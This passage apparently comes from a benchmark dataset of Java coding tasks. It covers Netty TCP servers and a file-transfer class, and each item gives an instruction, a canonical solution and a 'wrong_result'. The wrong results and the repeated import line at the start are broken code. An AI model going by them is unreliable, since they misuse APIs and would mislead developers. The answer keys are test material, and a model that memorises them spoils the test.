java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;"
  },
  {
    "Task_id": 213,
    "Instruction": "Task Description: Implement a Netty-based TCP server for handling remote commands with connection management and idle state detection.\n\nClass Description: NettyRemotingServer is a TCP server implementation using Netty framework that handles incoming remote commands, manages client connections, and provides event notification for connection changes. It supports configurable thread pools, connection idle detection, and custom channel event handling.\n\nAttributes:\n- serverBootstrap: ServerBootstrap - Netty server bootstrap instance for server configuration\n- bossSelectorGroup: EventLoopGroup - Netty event loop group for accepting connections\n- workerSelectorGroup: EventLoopGroup - Netty event loop group for handling I/O operations\n- defaultEventExecutorGroup: DefaultEventExecutorGroup - Thread pool for business logic processing\n- appContext: AppContext - Application context for dependency injection\n- LOGGER: Logger - Logger instance for server operations logging\n\nMethods:\n- NettyRemotingServer(AppContext, RemotingServerConfig) -> void - Constructor with application context and server configuration\n- NettyRemotingServer(RemotingServerConfig, ChannelEventListener) -> void - Constructor with server configuration and channel event listener\n- serverStart() -> void - Starts the Netty server, initializes thread pools and configures server bootstrap\n- serverShutdown() -> void - Shuts down the server gracefully, releasing all resources\n- NettyServerHandler: channelRead0(ChannelHandlerContext, RemotingCommand) -> void - Handles incoming message processing\n- NettyConnectManageHandler: channelRegistered(ChannelHandlerContext) -> void - Logs channel registration events\n- NettyConnectManageHandler: channelUnregistered(ChannelHandlerContext) -> void - Logs channel unregistration events\n- NettyConnectManageHandler: channelActive(ChannelHandlerContext) -> void - Handles new active connections\n- NettyConnectManageHandler: channelInactive(ChannelHandlerContext) -> void - Handles connection close events\n- NettyConnectManageHandler: userEventTriggered(ChannelHandlerContext, Object) -> void - Handles idle state events\n- NettyConnectManageHandler: exceptionCaught(ChannelHandlerContext, Throwable) -> void - Handles channel exceptions",
    "Canonical_solution": "import com.github.ltsopensource.core.AppContext;\nimport com.github.ltsopensource.core.factory.NamedThreadFactory;\nimport com.github.ltsopensource.core.logger.Logger;\nimport com.github.ltsopensource.remoting.*;\nimport com.github.ltsopensource.remoting.common.RemotingHelper;\nimport com.github.ltsopensource.remoting.exception.RemotingException;\nimport com.github.ltsopensource.remoting.protocol.RemotingCommand;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.timeout.IdleState;\nimport io.netty.handler.timeout.IdleStateEvent;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.util.concurrent.DefaultEventExecutorGroup;\n\nimport java.net.InetSocketAddress;\n\npublic class NettyRemotingServer extends AbstractRemotingServer {\n\n    public static final Logger LOGGER = AbstractRemotingServer.LOGGER;\n\n    private final ServerBootstrap serverBootstrap;\n    private final EventLoopGroup bossSelectorGroup;\n    private final EventLoopGroup workerSelectorGroup;\n    private DefaultEventExecutorGroup defaultEventExecutorGroup;\n    private AppContext appContext;\n\n    public NettyRemotingServer(AppContext appContext, RemotingServerConfig remotingServerConfig) {\n        this(remotingServerConfig, null);\n        this.appContext = appContext;\n    }\n\n    public NettyRemotingServer(RemotingServerConfig remotingServerConfig, final ChannelEventListener channelEventListener) {\n        super(remotingServerConfig, channelEventListener);\n        this.serverBootstrap = new ServerBootstrap();\n        this.bossSelectorGroup = new NioEventLoopGroup(1, new NamedThreadFactory(\"NettyBossSelectorThread_\"));\n        this.workerSelectorGroup = new NioEventLoopGroup(remotingServerConfig.getServerSelectorThreads(), new NamedThreadFactory(\"NettyServerSelectorThread_\", true));\n    }\n\n    @Override\n    protected void serverStart() throws RemotingException {\n        NettyLogger.setNettyLoggerFactory();\n\n        this.defaultEventExecutorGroup = new DefaultEventExecutorGroup(\n                remotingServerConfig.getServerWorkerThreads(),\n                new NamedThreadFactory(\"NettyServerWorkerThread_\")\n        );\n\n        final NettyCodecFactory nettyCodecFactory = new NettyCodecFactory(appContext, getCodec());\n\n        this.serverBootstrap.group(this.bossSelectorGroup, this.workerSelectorGroup)\n                .channel(NioServerSocketChannel.class)\n                .option(ChannelOption.SO_BACKLOG, 65536)\n                .option(ChannelOption.SO_REUSEADDR, true)\n                .childOption(ChannelOption.TCP_NODELAY, true)\n                .localAddress(new InetSocketAddress(this.remotingServerConfig.getListenPort()))\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(\n                                defaultEventExecutorGroup,\n                                nettyCodecFactory.getEncoder(),\n                                nettyCodecFactory.getDecoder(),\n                                new IdleStateHandler(remotingServerConfig.getReaderIdleTimeSeconds(),\n                                        remotingServerConfig.getWriterIdleTimeSeconds(), remotingServerConfig.getServerChannelMaxIdleTimeSeconds()),\n                                new NettyConnectManageHandler(),\n                                new NettyServerHandler());\n                    }\n                });\n\n        try {\n            this.serverBootstrap.bind().sync();\n        } catch (InterruptedException e) {\n            throw new RemotingException(\"Start Netty server bootstrap error\", e);\n        }\n    }\n\n    @Override\n    protected void serverShutdown() throws RemotingException {\n        this.bossSelectorGroup.shutdownGracefully();\n        this.workerSelectorGroup.shutdownGracefully();\n\n        if (this.defaultEventExecutorGroup != null) {\n            this.defaultEventExecutorGroup.shutdownGracefully();\n        }\n    }\n\n    class NettyServerHandler extends SimpleChannelInboundHandler<RemotingCommand> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, RemotingCommand msg) throws Exception {\n            processMessageReceived(new NettyChannel(ctx), msg);\n        }\n    }\n\n    class NettyConnectManageHandler extends ChannelDuplexHandler {\n        @Override\n        public void channelRegistered(ChannelHandlerContext ctx) throws Exception {\n            final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(new NettyChannel(ctx));\n            LOGGER.info(\"SERVER : channelRegistered {}\", remoteAddress);\n            super.channelRegistered(ctx);\n        }\n\n        @Override\n        public void channelUnregistered(ChannelHandlerContext ctx) throws Exception {\n            final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(new NettyChannel(ctx));\n            LOGGER.info(\"SERVER : channelUnregistered, the channel[{}]\", remoteAddress);\n            super.channelUnregistered(ctx);\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) throws Exception {\n            com.github.ltsopensource.remoting.Channel channel = new NettyChannel(ctx);\n            final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(channel);\n            LOGGER.info(\"SERVER: channelActive, the channel[{}]\", remoteAddress);\n            super.channelActive(ctx);\n\n            if (channelEventListener != null) {\n                putRemotingEvent(new RemotingEvent(RemotingEventType.CONNECT, remoteAddress, channel));\n            }\n        }\n\n        @Override\n        public void channelInactive(ChannelHandlerContext ctx) throws Exception {\n            com.github.ltsopensource.remoting.Channel channel = new NettyChannel(ctx);\n            final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(channel);\n            LOGGER.info(\"SERVER: channelInactive, the channel[{}]\", remoteAddress);\n            super.channelInactive(ctx);\n\n            if (channelEventListener != null) {\n                putRemotingEvent(new RemotingEvent(RemotingEventType.CLOSE, remoteAddress, channel));\n            }\n        }\n\n        @Override\n        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {\n            if (evt instanceof IdleStateEvent) {\n                IdleStateEvent event = (IdleStateEvent) evt;\n                com.github.ltsopensource.remoting.Channel channel = new NettyChannel(ctx);\n                final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(channel);\n\n                if (event.state().equals(IdleState.ALL_IDLE)) {\n                    LOGGER.warn(\"SERVER: IDLE [{}]\", remoteAddress);\n                    RemotingHelper.closeChannel(channel);\n                }\n\n                if (channelEventListener != null) {\n                    RemotingEventType remotingEventType = RemotingEventType.valueOf(event.state().name());\n                    putRemotingEvent(new RemotingEvent(remotingEventType, remoteAddress, channel));\n                }\n            }\n            ctx.fireUserEventTriggered(evt);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n            com.github.ltsopensource.remoting.Channel channel = new NettyChannel(ctx);\n            final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(channel);\n            LOGGER.warn(\"SERVER: exceptionCaught {}\", remoteAddress, cause);\n\n            if (channelEventListener != null) {\n                putRemotingEvent(new RemotingEvent(RemotingEventType.EXCEPTION, remoteAddress, channel));\n            }\n\n            RemotingHelper.closeChannel(channel);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class NettyRemotingServer {\n    private final ServerBootstrap serverBootstrap;\n    private final EventLoopGroup bossSelectorGroup;\n    private final EventLoopGroup workerSelectorGroup;\n    private final DefaultEventExecutorGroup defaultEventExecutorGroup;\n    private final AppContext appContext;\n    private final Logger LOGGER;\n\n    public NettyRemotingServer(AppContext appContext, RemotingServerConfig config) {\n        this.appContext = appContext;\n        this.defaultEventExecutorGroup = new DefaultEventExecutorGroup(config.getCorePoolSize());\n        this.bossSelectorGroup = new EpollEventLoopGroup(config.getBossThreadCount());\n        this.workerSelectorGroup = new EpollEventLoopGroup(config.getWorkerThreadCount());\n        this.serverBootstrap = new ServerBootstrap();\n        this.LOGGER = LoggerFactory.getLogger(NettyRemotingServer.class);\n    }\n\n    public NettyRemotingServer(RemotingServerConfig config, ChannelEventListener listener) {\n        this.appContext = new AppContext();\n        this.defaultEventExecutorGroup = new DefaultEventExecutorGroup(config.getCorePoolSize());\n        this.bossSelectorGroup = new EpollEventLoopGroup(config.getBossThreadCount());\n        this.workerSelectorGroup = new EpollEventLoopGroup(config.getWorkerThreadCount());\n        this.serverBootstrap = new ServerBootstrap();\n        this.LOGGER = LoggerFactory.getLogger(NettyRemotingServer.class);\n        // Register listener\n    }\n\n    public void serverStart() {\n        serverBootstrap.group(bossSelectorGroup, workerSelectorGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(new IdleStateHandler(30, 0, 0, TimeUnit.SECONDS));\n                        pipeline.addLast(new NettyConnectManageHandler());\n                        pipeline.addLast(new NettyServerHandler());\n                    }\n                })\n                .childOption(ChannelOption.SO_KEEPALIVE, true)\n                .childOption(ChannelOption.TCP_NODELAY, true);\n        serverBootstrap.bind(8080).syncUninterruptibly();\n    }\n\n    public void serverShutdown() {\n        bossSelectorGroup.shutdownGracefully();\n        workerSelectorGroup.shutdownGracefully();\n    }\n\n    static class NettyServerHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead0(ChannelHandlerContext ctx, RemotingCommand msg) {\n            // Process command\n        }\n    }\n\n    static class NettyConnectManageHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRegistered(ChannelHandlerContext ctx) {\n            LOGGER.info(\"Channel registered: {}\", ctx.channel().remoteAddress());\n        }\n\n        @Override\n        public void channelUnregistered(ChannelHandlerContext ctx) {\n            LOGGER.info(\"Channel unregistered: {}\", ctx.channel().remoteAddress());\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            LOGGER.info(\"Channel active: {}\", ctx.channel().remoteAddress());\n        }\n\n        @Override\n        public void channelInactive(ChannelHandlerContext ctx) {\n            LOGGER.info(\"Channel inactive: {}\", ctx.channel().remoteAddress());\n        }\n\n        @Override\n        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) {\n            if (evt instanceof IdleStateEvent) {\n                LOGGER.warn(\"Idle state detected for channel: {}\", ctx.channel().remoteAddress());\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 217,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process serialized data.\n\nClass Description: SerializationServer is a Netty-based TCP server that listens on a specified port for incoming connections, processes serialized data through a custom pipeline, and manages server resources efficiently.\n\nAttributes:\nPORT: static final int - The port number on which the server will listen for incoming connections (default: 8082)\n\nMethods:\nstart(): void - Starts the Netty TCP server with the following behavior:\n1. Creates boss and worker event loop groups for connection handling\n2. Configures server bootstrap with NIO transport channel\n3. Sets server options (backlog and keepalive)\n4. Adds logging handler and custom pipeline initializer\n5. Binds to the specified port and waits for server shutdown\n6. Cleans up resources on shutdown\n\nInput: None (The port is defined as a class constant)\n\nOutput: None (The method runs indefinitely until server shutdown)\n\nNote: The class requires proper exception handling for server operations and resource cleanup in finally block. The actual data processing is handled by a separate SerializationServerInitializer class which should be provided separately.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\npublic final class SerializationServer {\n\n    static final int PORT = 8082;\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .childOption(ChannelOption.SO_KEEPALIVE, true)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new SerializationServerInitializer());\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class SerializationServer {\n    public static final int PORT = 8082;\n\n    public void start() {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                     .channel(NioServerSocketChannel.class)\n                     .option(ChannelOption.BACKLOG, 100)\n                     .childOption(ChannelOption.SO_KEEPALIVE, true)\n                     .handler(new LoggingHandler(LogLevel.INFO))\n                     .childHandler(new SerializationServerInitializer());\n\n            ChannelFuture future = bootstrap.bind(PORT).sync();\n            future.channel().closeFuture().sync();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}"
  },
  {
    "Task_id": 219,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle HTTP requests, with optional SSL support for secure connections.\n\nClass Description: The HttpHelloWorldServer class is a Netty-based TCP server that listens for HTTP requests on a specified port. It supports both plain HTTP and HTTPS (when SSL is enabled) connections. The server uses a boss-worker thread model for handling connections and includes logging capabilities.\n\nAttributes:\n- SSL: static final boolean - Flag indicating whether SSL should be enabled\n- PORT: static final int - The port number on which the server will listen\n\nMethods:\n- start(): void - Starts the Netty TCP server. Throws Exception if any error occurs during startup.\n  - Input: None\n  - Output: None (but starts the server process)\n  - Description: Initializes SSL context if enabled, sets up event loop groups, configures server bootstrap with channel options and handlers, binds to the specified port, and keeps the server running until shutdown. Properly cleans up resources on shutdown.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class HttpHelloWorldServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL? \"8443\" : \"8080\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.option(ChannelOption.SO_BACKLOG, 1024);\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new HttpHelloWorldServerInitializer(sslCtx));\n\n            Channel ch = b.bind(PORT).sync().channel();\n\n            System.err.println(\"Open your web browser and navigate to \" +\n                    (SSL? \"https\" : \"http\") + \"://127.0.0.1:\" + PORT + '/');\n\n            ch.closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class HttpHelloWorldServer {\n    public static final boolean SSL = false;\n    public static final int PORT = 8080;\n\n    public void start() throws Exception {\n        SslContext sslCtx = null;\n        if (SSL) {\n            sslCtx = SslContext.newServerContext(\n                new SslContextBuilder()\n                    .trustManager(TrustManagerFactory.getInstance(\"X509\"))\n                    .keyManager(KeyManagerFactory.getInstance(\"X509\"))\n                    .build()\n            );\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (sslCtx != null) {\n                         p.addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     p.addLast(new HttpServerCodec());\n                     p.addLast(new HttpObjectAggregator(65536));\n                     p.addLast(new SimpleHttpServerHandler());\n                 }\n             })\n             .childOption(ChannelOption.SO_REUSEADDR, true)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture future = b.bind(PORT).sync();\n            future.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    private static class SimpleHttpServerHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            if (msg instanceof FullHttpRequest) {\n                FullHttpRequest req = (FullHttpRequest) msg;\n                String response = \"HTTP/1.1 200 OK\\r\\n\" +\n                                 \"Content-Type: text/plain\\r\\n\" +\n                                 \"Content-Length: 13\\r\\n\\r\\n\" +\n                                 \"Hello World\";\n                ctx.writeAndFlush(Unpooled.copiedBuffer(response, CharsetUtil.UTF_8));\n            } else {\n                ctx.fireChannelRead(msg);\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 22,
    "Instruction": "Task Description: Create a Java abstract class that handles file transfer operations using FileChannel for reading files and DataStreamOutput for writing data, with support for synchronization points during transfer.\n\nClass Description: TransferType is an abstract class that provides a framework for transferring file data in chunks using NIO FileChannel for reading and a DataStreamOutput for writing. It manages buffer sizes, synchronization points, and tracks transfer progress.\n\nAttributes:\n- path: String - The file path to be transferred\n- file: File - The File object representing the file to transfer\n- fileSize: long - The total size of the file in bytes\n- bufferSize: int - The size of the transfer buffer in bytes\n- syncSize: long - The interval size at which to perform synchronization\n- syncPosition: long - The current position for synchronization tracking\n\nMethods:\n- TransferType(String path, DataStream cli) - Constructor - Initializes the transfer with file path and configuration from DataStream client\n- getFile() -> File - Returns the File object being transferred\n- getBufferSize() -> int - Returns the buffer size for transfers\n- getPacketSize(long offset) -> long - Calculates the next packet size based on current offset\n- isSync(long position) -> boolean - Determines if current position requires synchronization\n- transfer(FileStoreClient client, RoutingTable routingTable) -> List<CompletableFuture<DataStreamReply>> - Performs the complete file transfer operation\n- write(FileChannel in, DataStreamOutput out, long offset, List<CompletableFuture<DataStreamReply>> futures) -> long - Abstract method to be implemented by subclasses for writing data\n- toString() -> String - Returns a string representation of the transfer object",
    "Canonical_solution": "import org.apache.ratis.examples.filestore.FileStoreClient;\nimport org.apache.ratis.io.StandardWriteOption;\nimport org.apache.ratis.protocol.DataStreamReply;\nimport org.apache.ratis.protocol.RoutingTable;\nimport org.apache.ratis.thirdparty.io.netty.buffer.ByteBuf;\nimport org.apache.ratis.thirdparty.io.netty.buffer.PooledByteBufAllocator;\nimport org.apache.ratis.util.FileUtils;\nimport org.apache.ratis.util.JavaUtils;\nimport org.apache.ratis.util.Preconditions;\n\nimport java.io.File;\nimport java.io.IOException;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.StandardOpenOption;\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.concurrent.CompletableFuture;\n\nabstract static class TransferType {\n    private final String path;\n    private final File file;\n    private final long fileSize;\n    private final int bufferSize;\n    private final long syncSize;\n    private long syncPosition = 0;\n\n    TransferType(String path, DataStream cli) {\n        this.path = path;\n        this.file = new File(path);\n        this.fileSize = cli.getFileSizeInBytes();\n        this.bufferSize = cli.getBufferSizeInBytes();\n        this.syncSize = cli.getSyncSize();\n\n        final long actualSize = file.length();\n        Preconditions.assertTrue(actualSize == fileSize, () -> \"Unexpected file size: expected size is \"\n                + fileSize + \" but actual size is \" + actualSize + \", path=\" + path);\n    }\n\n    File getFile() {\n        return file;\n    }\n\n    int getBufferSize() {\n        return bufferSize;\n    }\n\n    long getPacketSize(long offset) {\n        return Math.min(bufferSize, fileSize - offset);\n    }\n\n    boolean isSync(long position) {\n        if (syncSize > 0) {\n            if (position >= fileSize || position - syncPosition >= syncSize) {\n                syncPosition = position;\n                return true;\n            }\n        }\n        return false;\n    }\n\n    List<CompletableFuture<DataStreamReply>> transfer(\n            FileStoreClient client, RoutingTable routingTable) throws IOException {\n        if (fileSize <= 0) {\n            return Collections.emptyList();\n        }\n\n        final List<CompletableFuture<DataStreamReply>> futures = new 